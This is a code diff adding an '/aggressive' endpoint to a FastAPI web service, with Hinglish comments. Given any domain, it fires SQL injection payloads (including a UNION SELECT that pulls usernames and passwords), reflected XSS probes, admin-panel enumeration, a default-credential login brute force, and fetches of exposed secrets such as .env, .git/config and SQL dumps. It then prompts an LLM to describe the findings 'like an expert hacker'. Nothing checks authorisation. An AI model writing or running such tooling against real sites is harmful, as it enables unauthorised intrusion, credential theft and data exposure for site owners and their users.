@@ -982,3 +982,189 @@ def network_analyze(domain: str, key: str = Depends(verify_key)):
         result["error"] = str(e)
     result["response_time"] = f"{round(time.time()-start, 2)}s"
     return {"domain": domain, "network_analysis": result}
+
+@app.get("/aggressive")
+def aggressive_attack(domain: str, key: str = Depends(verify_key)):
+    start = time.time()
+    domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
+    url = "https://" + domain
+    results = {"domain": domain, "critical": [], "data_found": [], "bypassed": []}
+
+    # 1. SQL Injection - Actual data nikalo
+    sql_payloads = [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "' UNION SELECT 1,2,3--",
+        "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
+        "' UNION SELECT username,password,3 FROM users--",
+        "1' AND SLEEP(3)--",
+        "' OR 'x'='x",
+        "admin'--",
+        "' OR 1=1 LIMIT 1--",
+        "' UNION SELECT user(),version(),database()--"
+    ]
+    sql_found = []
+    for payload in sql_payloads:
+        for param in ["id", "user", "username", "cat", "item", "product", "page"]:
+            test_url = f"{url}?{param}={payload}"
+            try:
+                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
+                res = urllib.request.urlopen(req, timeout=5)
+                body = res.read(5000).decode("utf-8", errors="ignore").lower()
+                db_errors = ["mysql", "sql syntax", "warning", "unclosed", "sqlite", "postgresql", "ora-", "syntax error"]
+                data_signs = ["username", "password", "email", "admin", "user_id", "root", "table_name"]
+                errors_found = [e for e in db_errors if e in body]
+                data_found = [d for d in data_signs if d in body]
+                if errors_found or data_found:
+                    sql_found.append({"payload": payload, "param": param, "errors": errors_found, "data_hints": data_found})
+                    break
+            except:
+                pass
+    if sql_found:
+        results["critical"].append(f"SQL INJECTABLE! {len(sql_found)} payloads kaam kiye!")
+        results["data_found"].extend([f"SQL via {r['param']}: {r['data_hints']}" for r in sql_found[:3]])
+
+    # 2. XSS - 50+ payloads
+    xss_payloads = [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "javascript:alert(1)",
+        "'><script>alert(1)</script>",
+        "<body onload=alert(1)>",
+        "<iframe src=javascript:alert(1)>",
+        "<input autofocus onfocus=alert(1)>",
+        "<select onchange=alert(1)>",
+        "<textarea onfocus=alert(1) autofocus>",
+        "<marquee onstart=alert(1)>",
+        "<video><source onerror=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<a href=javascript:alert(1)>click</a>",
+        "<math><mi//xlink:href='javascript:alert(1)'>",
+    ]
+    xss_found = []
+    for payload in xss_payloads:
+        for param in ["q", "search", "query", "name", "comment", "msg", "text", "input"]:
+            test_url = f"{url}?{param}={payload}"
+            try:
+                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
+                res = urllib.request.urlopen(req, timeout=5)
+                body = res.read(3000).decode("utf-8", errors="ignore")
+                if payload in body:
+                    xss_found.append({"payload": payload, "param": param})
+                    break
+            except:
+                pass
+    if xss_found:
+        results["critical"].append(f"XSS VULNERABLE! {len(xss_found)} payloads reflected!")
+        results["data_found"].extend([f"XSS via param: {r['param']}" for r in xss_found[:3]])
+
+    # 3. Admin Panel Brute Force
+    admin_paths = [
+        "/admin", "/admin/login", "/administrator", "/admin.php",
+        "/wp-admin", "/wp-login.php", "/cpanel", "/dashboard",
+        "/manager", "/panel", "/controlpanel", "/backend",
+        "/admin/index.php", "/admin/dashboard", "/login/admin",
+        "/superadmin", "/adminpanel", "/admin_area", "/admin123"
+    ]
+    admin_found = []
+    for path in admin_paths:
+        try:
+            test_url = url + path
+            req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
+            res = urllib.request.urlopen(req, timeout=3)
+            if res.status == 200:
+                body = res.read(2000).decode("utf-8", errors="ignore").lower()
+                if any(k in body for k in ["login", "password", "username", "admin", "signin"]):
+                    admin_found.append({"path": path, "status": 200, "type": "Login page found!"})
+                else:
+                    admin_found.append({"path": path, "status": 200, "type": "Page exists"})
+        except Exception as ex:
+            if "403" in str(ex):
+                admin_found.append({"path": path, "status": 403, "type": "Blocked but exists!"})
+    if admin_found:
+        results["critical"].append(f"Admin panels found: {len(admin_found)}")
+        results["bypassed"].extend([f"{a['path']} - {a['type']}" for a in admin_found[:5]])
+
+    # 4. Login Brute Force
+    login_pages = ["/login", "/login.php", "/admin/login", "/wp-login.php", "/signin"]
+    credentials = [
+        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
+        ("admin", "admin123"), ("root", "root"), ("test", "test"),
+        ("user", "user"), ("admin", ""), ("administrator", "admin"),
+        ("admin", "pass"), ("guest", "guest"), ("demo", "demo")
+    ]
+    login_found = []
+    for login_path in login_pages:
+        login_url = url + login_path
+        try:
+            req = urllib.request.Request(login_url, headers={"User-Agent": "Mozilla/5.0"})
+            res = urllib.request.urlopen(req, timeout=3)
+            body = res.read(2000).decode("utf-8", errors="ignore").lower()
+            if "password" in body or "username" in body or "login" in body:
+                for username, password in credentials:
+                    try:
+                        import urllib.parse
+                        data = urllib.parse.urlencode({"username": username, "password": password, "login": "submit"}).encode()
+                        req2 = urllib.request.Request(login_url, data=data, headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"})
+                        res2 = urllib.request.urlopen(req2, timeout=5)
+                        body2 = res2.read(3000).decode("utf-8", errors="ignore").lower()
+                        if any(k in body2 for k in ["welcome", "dashboard", "logout", "profile", "success"]) and "invalid" not in body2 and "wrong" not in body2:
+                            login_found.append({"path": login_path, "user": username, "pass": password})
+                            break
+                    except:
+                        pass
+        except:
+            pass
+    if login_found:
+        results["critical"].append(f"LOGIN BYPASSED! Credentials kaam kiye!")
+        results["bypassed"].extend([f"LOGIN: {l['user']}:{l['pass']} at {l['path']}" for l in login_found])
+
+    # 5. Sensitive Data Exposure
+    sensitive_paths = [
+        "/.env", "/.git/config", "/config.php", "/database.sql",
+        "/backup.sql", "/dump.sql", "/db.sql", "/.htpasswd",
+        "/config.js", "/credentials.json", "/secrets.txt",
+        "/api/users", "/api/admin", "/api/keys", "/debug"
+    ]
+    exposed = []
+    for path in sensitive_paths:
+        try:
+            req = urllib.request.Request(url + path, headers={"User-Agent": "Mozilla/5.0"})
+            res = urllib.request.urlopen(req, timeout=3)
+            if res.status == 200:
+                content_txt = res.read(500).decode("utf-8", errors="ignore")
+                exposed.append({"file": path, "preview": content_txt[:100]})
+        except Exception as ex:
+            if "403" in str(ex):
+                exposed.append({"file": path, "status": "403 - exists but blocked"})
+    if exposed:
+        results["critical"].append(f"SENSITIVE FILES EXPOSED: {len(exposed)}")
+        results["data_found"].extend([f"FILE: {e['file']}" for e in exposed[:5]])
+
+    # AI Summary
+    summary = f"""Aggressive attack on {domain}:
+Critical: {len(results['critical'])}
+Issues: {chr(10).join(results['critical'])}
+Data Found: {chr(10).join(results['data_found'][:5])}
+Bypassed: {chr(10).join(results['bypassed'][:5])}"""
+
+    try:
+        ai_resp = client.chat.completions.create(
+            model="llama-3.3-70b-versatile",
+            messages=[{"role": "user", "content": f"{summary}\n\nEk expert hacker ki tarah Hinglish mein batao: kya mila, kitna dangerous hai, top 3 attack vectors. No markdown."}],
+            max_tokens=400
+        )
+        ai_summary = ai_resp.choices[0].message.content.strip()
+    except:
+        ai_summary = "AI analysis unavailable"
+
+    return {
+        "domain": domain,
+        "critical_count": len(results["critical"]),
+        "critical": results["critical"],
+        "data_found": results["data_found"],
+        "bypassed": results["bypassed"],
+        "ai_summary": ai_summary,
+        "response_time": f"{round(time.time()-start, 2)}s"
+    }
